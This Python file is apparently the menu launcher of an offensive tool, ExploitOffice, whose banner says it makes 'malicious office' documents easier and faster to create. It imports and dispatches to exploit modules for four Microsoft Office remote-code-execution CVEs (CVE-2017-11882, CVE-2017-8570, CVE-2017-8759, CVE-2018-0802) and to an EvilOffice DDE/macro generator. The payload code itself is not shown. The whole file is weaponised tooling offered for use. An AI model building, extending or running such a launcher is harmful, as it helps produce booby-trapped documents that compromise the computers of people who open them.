import os, re, sys, binascii, time, json, random
from CVE_RCE.cve_2017_11882 import cve_2017_11882
from CVE_RCE.cve_2017_8570 import cve_2017_8570
from CVE_RCE.cve_2017_8759 import cve_2017_8759
from CVE_RCE.cve_2018_0802 import cve_2018_0802
from eviloffice.eviloffice import EvilOffice

class OfficeExploit(object):
	def __init__(self):
		self.r = '\033[31m'
		self.g = '\033[32m'
		self.y = '\033[33m'
		self.b = '\033[34m'
		self.m = '\033[35m'
		self.c = '\033[36m'
		self.w = '\033[37m'
		#Enter Options
		try:
			self.select = sys.argv[1]
		except:
			self.cls()
			self.print_logo()
			self.Print_options()
			sys.exit()
		#Process Select 1: CVE - RCE
		if self.select == str('1'):
			self.cls()
			self.print_logo()
			self.select_option_1()

			try:
				self.thCVE = raw_input(self.r + '    [+]' + self.c + 'Enter Option: ' + self.y)
			except:
				self.thCVE = input(self.r + '    [+]' + self.c + 'Enter Option: ' + self.y)

			if self.thCVE == str('1'):
				cve_2017_11882()
			elif self.thCVE == str('2'):
				cve_2017_8570()
			elif self.thCVE == str('3'):
				cve_2017_8759()
			elif self.thCVE == str('4'):
				cve_2018_0802()
		##Process Select 2: DDE && Macro
		elif self.select == str('2'):
		  	self.cls()
		  	EvilOffice()

			

	def cls(self):
		linux = 'clear'
		windows = 'cls'
		os.system([linux, windows][os.name == 'nt'])

	def print_logo(self):
		clear = "\x1b[0m"
		colors = [36, 32, 34, 35, 31, 37]

		x = """
	This tools will help you create malicious office easier and faster
           ________  .____  ._____  _  ____ __ ______             _      __ ___
          /  ____  \/  .__\/  .___\| |/ ____/.  _____|          | |     (p)  (2)
         |  |    |  . |____. |____ | | .     | |__  __  ___ __  | | ___  _| |
         |  |    |  |  ____\  ____\| | |     |  __| \ \/ / ._  \| |/ _ \| | |
         |  |____|  | |    | |     | | ._____| |____ >  <| |_)  | | (_) | | |
          \________/|_|    |_|     |_|\_____/|______/_/\_\ .___/|_|\___/|_|_|
                                                         | |
                                                         |_|
		"""
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.05)

	def Print_options(self):
		print(self.r + '    [' + self.y + '1' + self.r + '] ' + self.c + 'CVE-RCE Office' + self.w +
              '     [ ' + 'python ExploitOffice.py 1' + ' ]')
		print(self.r + '    [' + self.y + '2' + self.r + '] ' + self.c + 'Evil Office (https://github.com/thelinuxchoice/eviloffice)' + self.w + '         [ '
               + 'python ExploitOffice.py 2' + ' ]')
		print(self.r + '    [' + self.y + '3' + self.r + '] ' + self.c + 'Check Update' + self.w + '      [ '
              + 'python ExploitOffice.py 3' + ' ]')

	def select_option_1(self):
		print(self.r + '    [' + self.y + '1' + self.r + '] ' + self.c + 'CVE-2017-11882' + self.w)
		print(self.r + '    [' + self.y + '2' + self.r + '] ' + self.c + 'CVE-2017-8570' + self.w)
		print(self.r + '    [' + self.y + '3' + self.r + '] ' + self.c + 'CVE-2017-8759' + self.w)
		print(self.r + '    [' + self.y + '4' + self.r + '] ' + self.c + 'CVE-2018-0802 (Same CVE-2017-11882)' + self.w)

OfficeExploit()